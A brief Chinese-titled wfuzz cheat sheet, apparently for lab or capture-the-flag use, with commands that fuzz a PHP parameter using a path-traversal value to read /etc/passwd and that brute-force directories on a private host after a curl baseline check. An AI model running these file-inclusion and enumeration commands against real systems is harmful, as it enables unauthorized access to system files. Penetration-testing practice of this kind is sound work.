# Wufzz 实战手册

# fuzz 文件包含

```
sudo wfuzz -u "10.10.10.18/secret/evil.php?FUZZ=../../../../../../../etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt --hw 0
```

```
curl -s "http://10.10.10.40:8000/thispagedoesnotexist123xyz" | wc -l

sudo wfuzz -u "http://10.10.10.40:8000/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 --hh 7
```